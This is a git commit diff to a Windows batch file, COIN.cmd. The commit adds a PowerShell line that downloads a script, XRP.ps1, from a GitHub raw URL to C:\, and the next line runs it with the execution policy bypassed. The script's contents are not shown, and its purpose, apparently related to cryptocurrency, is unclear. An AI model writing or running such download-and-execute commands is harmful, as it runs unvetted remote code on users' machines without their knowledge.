150582da367d5a040fa29c4d5e145a377104f731
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 10:42:32 +0700

    COIN.cmd

--- COIN.cmd
+++ COIN.cmd
@@ -1,2 +1,3 @@
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1" -OutFile "C:\XRP.ps1"
 powershell.exe -ExecutionPolicy Bypass -File "C:\XRP.ps1"
 powershell.exe exit
